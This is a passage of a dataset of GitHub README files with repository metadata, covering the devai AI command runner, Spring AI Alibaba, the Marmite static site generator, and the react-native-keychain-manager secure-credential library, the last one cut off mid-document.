        - `inputs` the list of inputs from Stage 1 or command line
        - `outputs` the list of outputs from Stage 4 or null for each input
        - Note: the `inputs` and `outputs` arrays are kept in sync, and `null` will be in the output if not found. 
    - Can return some data, which will be labeled `after_all` for the caller of this function. e.g. `devai::run(agent, inputs)`



## Usage & Concept

Usage: `devai run proof-rust-comments -f ""./src/main.rs""`

(or have any glob like `-f ""./src/**/*.rs""`)
- This will initialize the `.devai/defaults` folder with the ""Command Agent Markdown"" `proof-rust-comments.md` (see [.devai/defaults/proof-comments.md`](./_init/agents/proof-comments.devai)) and run it with genai as follows: 
    - `-f ""./src/**/*.rs""`: The `-f` command line argument takes a glob and will create an ""input"" for each file, which can then be accessed in the `# Data` scripting section.
    - `# Data`, which contains a ```lua``` block that will get executed with the `input` value (the file reference in our example above).
        - With **Lua**, there are some utility functions to list files, load file content, and such that can then be used in the instruction section. 
    - `# Instruction`, which is a Handlebars template section, has access to `input` as well as the output of the `# Data` section, accessible as the `data` variable. 
        - This will be sent to the AI.
    - `# Output`, which now executes another ```lua``` block, using the `input`, `data`, and `ai_response` (with `ai_response.content`), which is the string returned by the AI. 
        - It can save files in place or create new files. 
        - Later, it will even be able to queue new devai work.
- By default, this will run with `gpt-4o-mini` and look for the `OPENAI_API_KEY` environment variable.
- It supports all AI providers supported by the [genai crate](https://crates.io/crates/genai).
    - Here are the environment variable names per provider: `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `COHERE_API_KEY`, `GEMINI_API_KEY`, `GROQ_API_KEY`.
    - On Mac, if the environment variable is not present, it will attempt to prompt and get/save it from the keychain, under the devai group.

## `devai` command arguments

```sh
# Will create/update the .devai/ settings folder (not required, automatically runs on ""run"")
devai init

# Will execute the proof-rust-comments.md from `.devai/customs/` or `.devai/defaults/` on 
# any file matching `./**/mod.rs` (those will become 'inputs' in the data section)
devai run proof-rust-comments -f mod.rs

# Verbose mode will print in the console what is sent to the AI, the AI response, and the output returned if string-like
devai run proof-rust-comments -f mod.rs --verbose 

# Verbose and watch mode. Every time proof-rust-comments is updated, it will run it again
devai run proof-rust-comments -f main.rs -v -w

# Will perform the verbose, watch, but in dry mode request, will print only the rendered instruction
devai run proof-rust-comments -f main.rs -v -w --dry req

# Will perform the verbose, watch, but in dry mode response, will print rendered instruction, AI response
# and will NOT execute the data
devai run proof-rust-comments -f main.rs -v -w --dry res

# Happy coding!
```

- `init` sub-command - initialize or update the `.devai/` folder (non-destructive, only adds files that are missing)
- `run` sub-command
    - The first argument is the command name. 
    - `-f` the file name or glob input files as inputs. Can have multiple `-f`
    - `--verbose` (`-v`) will print the rendered output in the command line.
    - `--dry req` will perform a dry run of the request by just running the **data** and **instruction** sections. Use `--verbose` to print out the sections.
    - `--dry res` will perform a dry run of the request, send it to the AI, and return the AI output (does not return data). Use `--verbose` to see what has been sent and returned.

## devai folder structure

(Updated in version `0.1.1` - migration from `0.1.0` implemented on `devai run` and `devai init`)

- `.devai/` - The root folder of devai
    - `custom/` - Where user custom agents and templates are stored. These will take precedence over the `.devai/default/...` matching files.
        - `command-agent/` - The custom agents. 
        - `new-template/` - Template(s) used to create new agents, e.g., `devai new my-new-cool-agent`
            - `command-agent/` - The folder containing the custom templates for command agents.
            - `solo-agent/` - The folder containing custom templates for solo agents (coming later)
    - `default/` - The default command agents and templates provided by devai (these files will only be created if missing)
        - `command-agent/` - The default command agents.
        - `new-template/` - The default template(s) used to create new agents, e.g., `devai new my-new-cool-agent`
            - `command-agent/` - The folder containing the default templates for command agents.
            - `solo-agent/` - The folder containing the default templates for solo agents (coming later)

## Example of a Command Agent File

`.devai/defaults/proof-rust-comments.md` (see [.devai/defaults/proof-rust-comments.md`](./_base/agents/proof-rust-comments.md))

## Config

On `devai run` or `devai init`, a `.devai/config.toml` will be created with the following:

```toml
[genai]
# Required (any model rust genai crate supports).
model = ""gpt-4o-mini"" 

[runtime]
# Default to 1 if absent. A great way to increase speed when using remote AI services.
inputs_concurrency = 1 
```

## Future Plan

- Support for the `# inputs` section with `yaml` or **Lua**.
- More **Lua** modules/functions.
- Support for `# Before All`, `# Before`, `# After`, and `# After All` (all **Lua**).
- `--capture` will perform the normal run but capture the request and response in the request/response file.
",0,12,2,Apache-2.0,,3.0
alibaba/spring-ai-alibaba,main,"# [Spring AI Alibaba](https://sca.aliyun.com/ai/)

[‰∏≠ÊñáÁâàÊú¨](./README-zh.md)

An AI application framework for Java developers built on top of Spring AI that provides seamless integration with Alibaba Cloud QWen LLM services and cloud-native infrastructures.

## Get Started

Please refer to [quick start](https://sca.aliyun.com/ai/get-started/) for how to quickly add generative AI to your Spring Boot applications.

Overall, it takes only two steps to turn your Spring Boot application into an intelligent agent:

> Because Spring AI Alibaba is developed based on Spring Boot 3.x, it requires JDK version 17 and above.

1. Add 'spring-ai-alibaba-starter' dependency to your project.

	```xml
	<dependency>
		<groupId>com.alibaba.cloud.ai</groupId>
		<artifactId>spring-ai-alibaba-starter</artifactId>
		<version>1.0.0-M3.2</version>
	</dependency>
	```

	> NOTICE: Since spring-ai related packages haven't been published to the central repo yet, it's needed to add the following maven repository to your project in order to successfully resolve artifacts like  spring-ai-core.
	>
	> ```xml
	> <repositories>
	> 	<repository>
	> 		<id>spring-milestones</id>
	> 		<name>Spring Milestones</name>
	> 		<url>https://repo.spring.io/milestone</url>
	> 		<snapshots>
	> 			<enabled>false</enabled>
	> 		</snapshots>
	> 	</repository>
	> </repositories>
	> ```
	> Addendum: If the mirrorOf tag in your local Maven settings. xml is configured with the wildcard *, please modify it according to the following example.
	> ```xml
	> <mirror>
	>   <id>xxxx</id>
	>   <mirrorOf>*,!spring-milestones</mirrorOf>
	>   <name>xxxx</name>
	>   <url>xxxx</url>
	> </mirror>
	> ```

2. Inject `ChatClient`

	```java
	@RestController
	public class ChatController {

		private final ChatClient chatClient;

		public ChatController(ChatClient.Builder builder) {
			this.chatClient = builder.build();
		}

		@GetMapping(""/chat"")
		public String chat(String input) {
			return this.chatClient.prompt()
					.user(input)
					.call()
					.content();
		}
	}
	```

## Examples

More examples can be found at [spring-ai-alibaba-examples](./spring-ai-alibaba-examples).

* Hello World
* Chat Model
* Multi Model
* Function Calling
* Structured Output
* Prompt
* RAG
* Flight Booking Playground, an advanced example showcasing usage of prompt template, function calling, chat memory and rag at the same time.

## Core Features

Spring AI Alibaba provides the following features, read the [documentation](https://sca.aliyun.com/ai) on our website for more details of how to use these features.

* Support for Alibaba Cloud QWen Model and Dashscope Model service.
* Support high-level AI agent abstraction -- ChatClient.
* Support various Model types like Chat, Text to Image, Audio Transcription, Text to Speech.
* Both synchronous and stream API options are supported.
* Mapping of AI Model output to POJOs.
* Portable API across Vector Store providers.
* Function calling.
* Spring Boot Auto Configuration and Starters.
* RAG (Retrieval-Augmented Generation) support: DocumentReader, Splitter, Embedding, VectorStore, and Retriever.
* Support conversation with ChatMemory

## Roadmap

Spring AI Alibaba aims to reduce the complexity of building ai native java applications, from development, evaluation to deployment and observability. In order to achieve that, we provide both open-source framework and ecosystem integrations around it, below are the features that we plan to support in the near future:
* Prompt Template Management
* Event Driven AI Application
* Support of more Vector Databases
* Function Deployment
* Observability
* AI proxy support: prompt filtering, rate limit, multiple Model, etc.
* Development Tools

![ai-native-architecture](./docs/imgs/spring-ai-alibaba-arch.png)

## References
* [Spring AI](https://docs.spring.io/spring-ai/reference/index.html)
* [Spring AI Alibaba](https://sca.aliyun.com/docs/ai/overview/)
* [Alibaba Cloud Dashscope Model Service Platform (ÈòøÈáå‰∫ëÁôæÁÇºÊ®°ÂûãÊúçÂä°ÂèäÂ∫îÁî®ÂºÄÂèëÂπ≥Âè∞)](https://help.aliyun.com/zh/model-studio/getting-started/what-is-model-studio/)

## Contact Us
* Dingtalk Group (ÈíâÈíâÁæ§), search `64485010179` and join.
* Wechat Group (ÂæÆ‰ø°ÂÖ¨‰ºóÂè∑), scan the QR code below and follow us.

<img src=""./docs/imgs/wechat-account.png"" style=""width:260px;""/>
",3,22,3,Apache-2.0,code-format-check.yml,100.0
rochacbruno/marmite,main,"# Marmite

<img src=""https://github.com/rochacbruno/marmite/raw/main/assets/_resized/logo_160x120.png"" align=""left"" alt=""marmite"">

Marmite [**Mar**kdown **m**akes s**ite**s] is a **very!** simple static site generator.

[![AGPL License](https://img.shields.io/badge/license-AGPL-blue.svg)](http://www.gnu.org/licenses/agpl-3.0)
[![Crates.io Version](https://img.shields.io/crates/v/marmite)](https://crates.io/crates/marmite)
[![Docs and Demo](https://img.shields.io/badge/docs-demo-blue)](https://rochacbruno.github.io/marmite/)  
  
[![Create blog](https://img.shields.io/badge/CREATE%20YOUR%20BLOG%20WITH%20ONE%20CLICK-20B2AA?style=for-the-badge)](https://github.com/rochacbruno/blog)


> I'm a big user of other SSGs but it is frequently frustrating that it takes so much setup to get started.  
Just having a directory of markdown files and running a single command sounds really useful.  
&mdash; Michael, marmite user.

## How it works

It does **""one""** simple thing only:

- Reads all `.md` files on the `input` directory.
- Using `CommonMark` parse it to `HTML` content.
- Extract optional metadata from `frontmatter` or `filename`.
- Generated `html` file for each page.
- Outputs the rendered static site to the `output` folder.

It also handles generating or copying `static/` and `media/` to the `output` dir.

## Before you start, you should know

1. Marmite is meant to be simple, don't expect complex features
2. Marmite is for **bloggers**, so writing and publishing articles in chronological order is the main use case.
3. The generated static site is a **flat** HTML site, no subpaths, all content is published in extension ending URLS ex: `./{name}.html|rss|json`
4. There are only 2 taxonomies `tags:` (to group similar content together) and `stream:` (to separate content in a different listing) 
5. Marmite uses the `date:` attribute to differentiate `posts` from `pages`

## Features

- Everything embedded in a single binary.
- Zero-Config to get started.
  - optionally fully configurable
- Common-mark + Github Flavoured Markdown + Extensions.
- Raw HTML allowed.
- Emojis `:smile:`, spoiler `||secret||`.
- Wikilinks `[[name|url]]` and Obsidian links `[[page]]`.
- Backlinks.
- Tags.
- Multi authors.
  - Author profile page
- Multi streams.
  - Separate content in different listing
- Pagination.
- Static Search Index.
- RSS Feeds.
  - Multiple feeds (index, tags, authors, streams)
- Built-in HTTP server.
- Auto rebuild when content changes.
- Built-in theme 
  - Light and Dark modes.
  - Multiple colorschemes
  - Fully responsive
  - Spotlight Search.
  - Easy to replace the index page and add custom CSS/JS
  - Easy to customize the templates
  - Math and Mermaid diagrams.
  - Syntax Highlight.
  - Commenting system integration.
  - Banner images and `og:` tags.
- CLI to start a new theme from scratch


## Installation

Install with cargo

```bash
cargo binstall marmite
```
or

```bash
cargo install marmite
```

Or download the pre-built **binary** from the [releases](https://github.com/rochacbruno/marmite/releases)


<details>

<summary>Or use docker</summary>


> [!IMPORTANT]  
> The directory containing your marmite project must be mapped to containers `/input`  
> If running inside the directory use `$PWD:/input` 
> The result will be generates in a `site` folder inside the input dir.

Build
```console
$ docker run -v $PWD:/input ghcr.io/rochacbruno/marmite
Site generated at: site/
```
Serve (just add port mapping and the --serve)
```console
$ docker run -p 8000:8000 -v $PWD:/input ghcr.io/rochacbruno/marmite --serve
```

> [!INFO]  
> By default will run `:latest`, Add `:x.y.z` with the version you want to run.

</details>

## Usage

It's simple, really!

```console
$ marmite folder_with_markdown_files path_to_generated_site
Site generated at path_to_generated_site/
```

CLI

```console
‚ùØ marmite --help
Marmite is the easiest static site generator.

Usage: marmite [OPTIONS] <INPUT_FOLDER> <OUTPUT_FOLDER>

Arguments:
  <INPUT_FOLDER>   Input folder containing markdown files
  <OUTPUT_FOLDER>  Output folder to generate the site

Options:
      --serve            Serve the site with a built-in HTTP server
      --watch            Detect changes and rebuild the site automatically
      --bind <BIND>      Address to bind the server [default: localhost:8000]
      --config <CONFIG>  Path to custom configuration file [default: marmite.yaml]
      --debug            Print debug messages Deprecated: Use -vv for debug messages
      --init-templates   Initialize templates in the project
      --start-theme      Initialize a theme with templates and static assets
      --generate-config  Generate the configuration file
  -v, --verbose...       Verbosity level (0-4) [default: 0 warn] options: -v: info,-vv: debug,-vvv: trace,-vvvv: trace all
  -h, --help             Print help
  -V, --version          Print version

```

## Getting started

Read a tutorial on how to get started https://rochacbruno.github.io/marmite/getting-started.html and create your blog in minutes.


## Docs 

Read more on how to customize templates, add comments etc on https://rochacbruno.github.io/marmite/ 


## That's all!

**Marmite** is very simple.

If this simplicity does not suit your needs, there are other awesome static site generators.


Here are some that I recommend:

- [Cobalt](https://cobalt-org.github.io/)
- [Zola](https://www.getzola.org/)
- [Zine](https://zineland.github.io/)",8,14,1,AGPL-3.0,"build-release.yml,container.yml,main.yml",97.0
DorianMazur/react-native-keychain-manager,main,"<h1 align=""center"">react-native-keychain-manager</h1>

[![npm](https://img.shields.io/npm/v/react-native-keychain-manager.svg)](https://npmjs.com/package/react-native-keychain-manager)

# Keychain/Keystore Access for React Native

- [Keychain/Keystore Access for React Native](#keychainkeystore-access-for-react-native)
  - [Installation](#installation)
  - [Usage](#usage)
  - [API](#api)
    - [`setGenericPassword(username, password, [{ accessControl, accessible, accessGroup, service, securityLevel }])`](#setgenericpasswordusername-password--accesscontrol-accessible-accessgroup-service-securitylevel-)
    - [`hasGenericPassword([{ service }])`](#hasgenericpassword-service-)
    - [`getGenericPassword([{ authenticationPrompt, service, accessControl }])`](#getgenericpassword-authenticationprompt-service-accesscontrol-)
    - [`resetGenericPassword([{ service }])`](#resetgenericpassword-service-)
    - [`getAllGenericPasswordServices()`](#getallgenericpasswordservices)
    - [`setInternetCredentials(server, username, password, [{ accessControl, accessible, accessGroup, securityLevel }])`](#setinternetcredentialsserver-username-password--accesscontrol-accessible-accessgroup-securitylevel-)
    - [`hasInternetCredentials(server)`](#hasinternetcredentialsserver)
    - [`getInternetCredentials(server, [{ authenticationPrompt }])`](#getinternetcredentialsserver--authenticationprompt-)
    - [`resetInternetCredentials(server)`](#resetinternetcredentialsserver)
    - [`requestSharedWebCredentials()` (iOS and visionOS only)](#requestsharedwebcredentials-ios-and-visionos-only)
    - [`setSharedWebCredentials(server, username, password)` (iOS and visionOS only)](#setsharedwebcredentialsserver-username-password-ios-and-visionos-only)
    - [`canImplyAuthentication([{ authenticationType }])` (iOS and visionOS only)](#canimplyauthentication-authenticationtype--ios-and-visionos-only)
    - [`getSupportedBiometryType()`](#getsupportedbiometrytype)
    - [`getSecurityLevel([{ accessControl }])` (Android only)](#getsecuritylevel-accesscontrol--android-only)
    - [Options](#options)
      - [Data Structure Properties/Fields](#data-structure-propertiesfields)
        - [`authenticationPrompt` Properties](#authenticationprompt-properties)
      - [`Keychain.ACCESS_CONTROL` enum](#keychainaccess_control-enum)
      - [`Keychain.ACCESSIBLE` enum](#keychainaccessible-enum)
      - [`Keychain.AUTHENTICATION_TYPE` enum](#keychainauthentication_type-enum)
      - [`Keychain.BIOMETRY_TYPE` enum](#keychainbiometry_type-enum)
      - [`Keychain.SECURITY_LEVEL` enum (Android only)](#keychainsecurity_level-enum-android-only)
      - [`Keychain.STORAGE_TYPE` enum (Android only)](#keychainstorage_type-enum-android-only)
      - [`Keychain.SECURITY_RULES` enum (Android only)](#keychainsecurity_rules-enum-android-only)
  - [Important Behavior](#important-behavior)
    - [Rule 1: Automatic Security Level](#rule-1-automatic-security-level)
  - [Manual Installation](#manual-installation)
    - [iOS](#ios)
      - [Option: Manually](#option-manually)
      - [Option: With CocoaPods](#option-with-cocoapods)
      - [Enable `Keychain Sharing` entitlement for iOS 10+](#enable-keychain-sharing-entitlement-for-ios-10)
    - [Android](#android)
      - [Option: Manually](#option-manually-1)
      - [Proguard Rules](#proguard-rules)
  - [Unit Testing with Jest](#unit-testing-with-jest)
    - [Using a Jest `__mocks__` Directory](#using-a-jest-__mocks__-directory)
    - [Using a Jest Setup File](#using-a-jest-setup-file)
  - [Notes](#notes)
    - [Android Notes](#android-notes)
      - [Configuring the Android-specific behavior](#configuring-the-android-specific-behavior)
    - [iOS Notes](#ios-notes)
    - [macOS Catalyst](#macos-catalyst)
    - [visionOS](#visionos)
    - [Security](#security)

## Installation

1. Run `yarn add react-native-keychain-manager`

   1 a. **Only for React Native <= 0.59**: `$ react-native link react-native-keychain-manager` and check `MainApplication.java` to verify the package was added. See manual installation below if you have issues with `react-native link`.

2. Run `pod install` in `ios/` directory to install iOS dependencies.
3. If you want to support FaceID, add a `NSFaceIDUsageDescription` entry in your `Info.plist`.
4. Re-build your Android and iOS projects.

## Usage

```js
import * as Keychain from 'react-native-keychain-manager';

async () => {
  const username = 'zuck';
  const password = 'poniesRgr8';

  // Store the credentials
  await Keychain.setGenericPassword(username, password);

  try {
    // Retrieve the credentials
    const credentials = await Keychain.getGenericPassword();
    if (credentials) {
      console.log(
        'Credentials successfully loaded for user ' + credentials.username
      );
    } else {
      console.log('No credentials stored');
    }
  } catch (error) {
    console.log(""Keychain couldn't be accessed!"", error);
  }
  await Keychain.resetGenericPassword();
};
```

See `KeychainExample` for fully working project example.

Both `setGenericPassword` and `setInternetCredentials` are limited to strings only, so if you need to store objects etc, please use `JSON.stringify`/`JSON.parse` when you store/access it.

## API

### `setGenericPassword(username, password, [{ accessControl, accessible, accessGroup, service, securityLevel }])`

Will store the username/password combination in the secure storage. Resolves to `{service, storage}` or rejects in case of an error. `storage` - is a name of used internal cipher for saving secret; `service` - name used for storing secret in internal storage (empty string resolved to valid default name).

### `hasGenericPassword([{ service }])`

Will check if the username/password combination is available for service in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getGenericPassword([{ authenticationPrompt, service, accessControl }])`

Will retrieve the username/password combination from the secure storage. Resolves to `{ username, password, service, storage }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetGenericPassword([{ service }])`

Will remove the username/password combination from the secure storage. Resolves to `true` in case of success.

### `getAllGenericPasswordServices()`

Will retrieve all known service names for which a generic password has been stored (e.g., `setGenericPassword`).

_Note_: on iOS this will actully read the encrypted entries, so it will trigger an authentication UI if you have encrypted any entries with password/biometry.

### `setInternetCredentials(server, username, password, [{ accessControl, accessible, accessGroup, securityLevel }])`

Will store the server/username/password combination in the secure storage. Resolves to `{ username, password, service, storage }`;

### `hasInternetCredentials(server)`

Will check if the username/password combination for server is available in the secure storage. Resolves to `true` if an entry exists or `false` if it doesn't.

### `getInternetCredentials(server, [{ authenticationPrompt }])`

Will retrieve the server/username/password combination from the secure storage. Resolves to `{ username, password }` if an entry exists or `false` if it doesn't. It will reject only if an unexpected error is encountered like lacking entitlements or permission.

### `resetInternetCredentials(server)`

Will remove the server/username/password combination from the secure storage.

### `requestSharedWebCredentials()` (iOS and visionOS only)

Asks the user for a shared web credential. Requires additional setup both in the app and server side, see [Apple documentation](https://developer.apple.com/documentation/security/shared_web_credentials). Resolves to `{ server, username, password }` if approved and `false` if denied and throws an error if not supported on platform or there's no shared credentials.

### `setSharedWebCredentials(server, username, password)` (iOS and visionOS only)

Sets a shared web credential. Resolves to `true` when successful.

### `canImplyAuthentication([{ authenticationType }])` (iOS and visionOS only)

Inquire if the type of local authentication policy is supported on this device with the device settings the user chose. Should be used in combination with `accessControl` option in the setter functions. Resolves to `true` if supported.

### `getSupportedBiometryType()`

**On iOS and visionOS:** Get what type of hardware biometry support the device can use for biometric encryption. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported and enrolled, otherwise `null`.

**On Android:** Get what type of Class 3 (strong) biometry support the device has. Resolves to a `Keychain.BIOMETRY_TYPE` value when supported, otherwise `null`. In most devices this will return `FINGERPRINT` (except for Pixel 4 or similar where fingerprint sensor is not present).

> This method returns `null`, if the device haven't enrolled into fingerprint/FaceId. Even though it has hardware for it.

### `getSecurityLevel([{ accessControl }])` (Android only)

Get security level that is supported on the current device with the current OS. Resolves to `Keychain.SECURITY_LEVEL` enum value.

### Options

#### Data Structure Properties/Fields

| Key                        | Platform      | Description                                                                                      | Default                                                                   |
| -------------------------- |---------------| ------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------- |
| **`accessControl`**        | All           | This dictates how a keychain item may be used, see possible values in `Keychain.ACCESS_CONTROL`. | _None_                                                                    |
| **`accessible`**           | iOS, visionOS | This dictates when a keychain item is accessible, see possible values in `Keychain.ACCESSIBLE`.  | _`Keychain.ACCESSIBLE.WHEN_UNLOCKED`_                                     |
| **`accessGroup`**          | iOS, visionOS | In which App Group to share the keychain. Requires additional setup with entitlements.           | _None_                                                                    |
| **`authenticationPrompt`** | All           | What to prompt the user when unlocking the keychain with biometry or device password.            | See [`authenticationPrompt` Properties](#authenticationprompt-properties) |
| **`authenticationType`**   | iOS, visionOS | Policies specifying which forms of authentication are acceptable.                                | `Keychain.AUTHENTICATION_TYPE.DEVICE_PASSCODE_OR_BIOMETRICS`              |
| **`service`**              | All           | Reverse domain name qualifier for the service associated with password.                          | _App bundle ID_                                                           |
| **`storage`**              | Android only  | Force specific cipher storage usage during saving the password                                   | Select best available storage                                             |
| **`rules`**                | Android only  | Force following to a specific security rules                                                     | `Keychain.RULES.AUTOMATIC_UPGRADE`                                        |

##### `authenticationPrompt` Properties

| Key               | Platform     | Description                                                                                | Default                           |
| ----------------- | ------------ | ------------------------------------------------------------------------------------------ | --------------------------------- |
| **`title`**       | All          | Title of the authentication prompt when requesting a stored secret.                        | `Authenticate to retrieve secret` |
| **`subtitle`**    | Android only | Subtitle of the Android authentication prompt when requesting a stored secret.             | None. Optional                    |
| **`description`** | Android only | Description of the Android authentication prompt when requesting a stored secret.          | None. Optional                    |
| **`cancel`**      | Android only | Negative button text of the Android authentication prompt when requesting a stored secret. | `Cancel`                          |

#### `Keychain.ACCESS_CONTROL` enum

| Key                                           | Description                                                                            |
| --------------------------------------------- | -------------------------------------------------------------------------------------- |
| **`USER_PRESENCE`**                           | Constraint to access an item with either Touch ID or passcode.                         |
| **`BIOMETRY_ANY`**                            | Constraint to access an item with Touch ID for any enrolled fingers.                   |
| **`BIOMETRY_CURRENT_SET`**                    | Constraint to access an item with Touch ID for currently enrolled fingers.             |
| **`DEVICE_PASSCODE`**                         | Constraint to access an item with a passcode.                                          |
| **`APPLICATION_PASSWORD`**                    | Constraint to use an application-provided password for data encryption key generation. |
| **`BIOMETRY_ANY_OR_DEVICE_PASSCODE`**         | Constraint to access an item with Touch ID for any enrolled fingers or passcode.       |
| **`BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE`** | Constraint to access an item with Touch ID for currently enrolled fingers or passcode. |

> Note #1: `BIOMETRY_ANY`, `BIOMETRY_CURRENT_SET`, `BIOMETRY_ANY_OR_DEVICE_PASSCODE`, `BIOMETRY_CURRENT_SET_OR_DEVICE_PASSCODE` - recognized by Android as a requirement for Biometric enabled storage (Till we got a better implementation);
>
> Note #2: For Android we support only two states: `None` (default) and `Fingerprint` (use only biometric protected storage); `Face` recognition fails with ""User not authenticated"" exception, see issue #318

Refs:

- <https://developer.apple.com/documentation/security/secaccesscontrolcreateflags?language=objc>

#### `Keychain.ACCESSIBLE` enum

| Key                                       | Description                                                                                                                                                                            |
| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`WHEN_UNLOCKED`**                       | The data in the keychain item can be accessed only while the device is unlocked by the user.                                                                                           |
| **`AFTER_FIRST_UNLOCK`**                  | The data in the keychain item cannot be accessed after a restart until the device has been unlocked once by the user.                                                                  |
| **`ALWAYS`**                              | The data in the keychain item can always be accessed regardless of whether the device is locked.                                                                                       |
| **`WHEN_PASSCODE_SET_THIS_DEVICE_ONLY`**  | The data in the keychain can only be accessed when the device is unlocked. Only available if a passcode is set on the device. Items with this attribute never migrate to a new device. |
| **`WHEN_UNLOCKED_THIS_DEVICE_ONLY`**      | The data in the keychain item can be accessed only while the device is unlocked by the user. Items with this attribute do not migrate to a new device.                                 |
| **`AFTER_FIRST_UNLOCK_THIS_DEVICE_ONLY`** | The data in the keychain item cannot be accessed after a restart until the device has been unlocked once by the user. Items with this attribute never migrate to a new device.         |

Refs:

- <https://developer.apple.com/documentation/security/ksecattraccessiblewhenunlocked>

#### `Keychain.AUTHENTICATION_TYPE` enum

| Key                                 | Description                                                                               |
| ----------------------------------- | ----------------------------------------------------------------------------------------- |
| **`DEVICE_PASSCODE_OR_BIOMETRICS`** | Device owner is going to be authenticated by biometry or device passcode.                 |
| **`BIOMETRICS`**                    | Device owner is going to be authenticated using a biometric method (Touch ID or Face ID). |

Refs:

- <https://developer.apple.com/documentation/localauthentication/lapolicy>

#### `Keychain.BIOMETRY_TYPE` enum

| Key               | Description                                                          |
|-------------------|----------------------------------------------------------------------|
| **`TOUCH_ID`**    | Device supports authentication with Touch ID. (iOS only)             |
| **`FACE_ID`**     | Device supports authentication with Face ID. (iOS only)              |
| **`OPTIC_ID`**    | Device supports authentication with Optic ID. (visionOS only)        |
| **`FINGERPRINT`** | Device supports authentication with Fingerprint. (Android only)      |
| **`FACE`**        | Device supports authentication with Face Recognition. (Android only) |
| **`IRIS`**        | Device supports authentication with Iris Recognition. (Android only) |

Refs:

- <https://developer.apple.com/documentation/localauthentication/labiometrytype?language=objc>

#### `Keychain.SECURITY_LEVEL` enum (Android only)

If set, `securityLevel` parameter specifies minimum security level that the encryption key storage should guarantee for storing credentials to succeed.

| Key               | Description                                                                                                                                                                                                                            |
| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ANY`             | no security guarantees needed (default value); Credentials can be stored in FB Secure Storage;                                                                                                                                         |
| `SECURE_SOFTWARE` | requires for the key to be stored in the Android Keystore, separate from the encrypted data;                                                                                                                                           |
| `SECURE_HARDWARE` | requires for the key to be stored on a secure hardware (Trusted Execution Environment or Secure Environment). Read [this article](https://developer.android.com/training/articles/keystore#ExtractionPrevention) for more information. |

#### `Keychain.STORAGE_TYPE` enum (Android only)

| Key   | Description                            |
| ----- | -------------------------------------- |
| `FB`  | Facebook compatibility cipher          |
| `AES` | Encryptions without human interaction. |
| `RSA` | Encryption with biometrics.            |

#### `Keychain.SECURITY_RULES` enum (Android only)

| Key                 | Description                                                                                                                                                                                                                |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NONE`              | No rules. Be dummy, developer control everything                                                                                                                                                                           |
| `AUTOMATIC_UPGRADE` | Upgrade secret to the best available storage as soon as it is available and user request secret extraction. Upgrade not applied till we request the secret. This rule only applies to secrets stored with FacebookConseal. |

## Important Behavior

### Rule 1: Automatic Security Level

As a rule the library will try to apply the best possible encryption for storing secrets. Once the secret is stored however its does not try to upgrade it unless FacebookConseal was used and the option 'SECURITY_RULES' is set to 'AUTOMATIC_UPGRADE'

---

Q: What will happen if user disables/drops biometric usage?

A: User will lose ability to extract secret from storage. On re-enable biometric access to the secret will be possible again.

---

Q: Is it possible to implement automatic downgrading?

A: From security perspective any Automatic downgrading is treated as ""a loss of the trust"" point.
Developer should implement own logic to allow downgrade and deal with ""security loss"". _(My recommendation - never do that!)_

---

Q: How to enable automatic upgrade for FacebookConseal?

A: Do call `getGenericPassword({ ...otherProps, rules: ""AUTOMATIC_UPGRADE"" })` with extra property `rules` set to `AUTOMATIC_UPGRADE` string value.

---

Q: How to force a specific level of encryption during saving the secret?

A: Do call `setGenericPassword({ ...otherProps, storage: ""AES"" })` with forced storage.

> Note: attempt to force storage `RSA` when biometrics is not available will force code to reject call with errors specific to device biometric configuration state.

## Manual Installation

### iOS

#### Option: Manually

- Right click on Libraries, select **Add files to ""‚Ä¶""** and select `node_modules/react-native-keychain-manager/RNKeychainManager.xcodeproj`
- Select your project and under **Build Phases** -> **Link Binary With Libraries**, press the + and select `libRNKeychainManager.a`.
- make sure `pod 'RNKeychainManager'` is not in your `Podfile`

#### Option: With [CocoaPods](https://cocoapods.org/)

Add the following to your `Podfile` and run `pod update`:

```
pod 'RNKeychainManager', :path => '../node_modules/react-native-keychain-manager'
```

#### Enable `Keychain Sharing` entitlement for iOS 10+

For iOS 10 you'll need to enable the `Keychain Sharing` entitlement in the `Capabilities` section of your build target. (See screenshot). Otherwise you'll experience the error shown below.

![screen shot 2016-09-16 at 20 56 33](https://cloud.githubusercontent.com/assets/512692/18597833/15316342-7c50-11e6-92e7-781651e61563.png)

```
Error: {
  code = ""-34018"";
  domain = NSOSStatusErrorDomain;
  message = ""The operation couldn\U2019t be completed. (OSStatus error -34018.)"";
}
```

### Android

#### Option: Manually

- Edit `android/settings.gradle` to look like this (without the +):

```diff
rootProject.name = 'MyApp'

include ':app'

+ include ':react-native-keychain-manager'
+ project(':react-native-keychain-manager').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-keychain-manager/android')
```

- Edit `android/app/build.gradle` (note: **app** folder) to look like this:

```diff
apply plugin: 'com.android.application'

android {
  ...
}

dependencies {
  implementation fileTree(dir: 'libs', include: ['*.jar'])
  implementation 'com.android.support:appcompat-v7:23.0.1'
  implementation 'com.facebook.react:react-native:0.19.+'
+ implementation project(':react-native-keychain-manager')
}
```

- Edit your `MainApplication.java` (deep in `android/app/src/main/java/...`) to look like this (note **two** places to edit):

```diff
package com.myapp;

+ import com.dorianmazur.keychain.KeychainPackage;

....

public class MainActivity extends extends ReactActivity {

  @Override
  protected List<ReactPackage> getPackages() {
      return Arrays.<ReactPackage>asList(
              new MainReactPackage(),
+             new KeychainPackage()
      );
  }
  ...
}
```

#### Proguard Rules

On Android builds that use proguard (like release), you may see the following error:

```
RNKeychainManager: no keychain entry found for service:
JNI DETECTED ERROR IN APPLICATION: JNI FindClass called with pending exception java.lang.NoSuchFieldError: no ""J"" field ""mCtxPtr"" in class ""Lcom/facebook/crypto/cipher/NativeGCMCipher;"" or its superclasses
```

If so, add a proguard rule in `proguard-rules.pro`:

```
-keep class com.facebook.crypto.** {
   *;
}
```

## Unit Testing with Jest

